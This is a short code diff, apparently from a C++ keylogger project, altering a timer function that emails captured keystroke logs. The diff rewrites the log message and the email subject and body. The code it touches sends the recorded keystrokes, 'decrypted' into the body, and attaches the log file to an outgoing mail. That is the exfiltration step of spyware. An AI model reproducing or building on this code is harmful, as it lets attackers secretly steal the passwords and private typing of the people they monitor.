@@ -20,13 +20,13 @@ void timerSendMail()
 
 	if (last_file.empty())
 	{
-		Helper::writeLogFile("File creation was not succesfull. Keylog '" + keylog + "'");
+		Helper::writeLogFile("File was not created! Keylog '" + keylog + "'");
 		return;
 	}
 
-	int x = Mail::sendMail("Log [" + last_file + "]",
-		"Hi :)\nThe file has been attached to this mail :)\n"
-		"For testing, enjoy:\n" + keylog,
+	int x = Mail::sendMail("Log File [" + last_file + "]",
+		"The log file has been attached to this mail.\n"
+		"Keys have also been decrypted below:\n" + keylog,
 		inputOutput::getOurPath(true) + last_file);
 
 	if (x != 7)
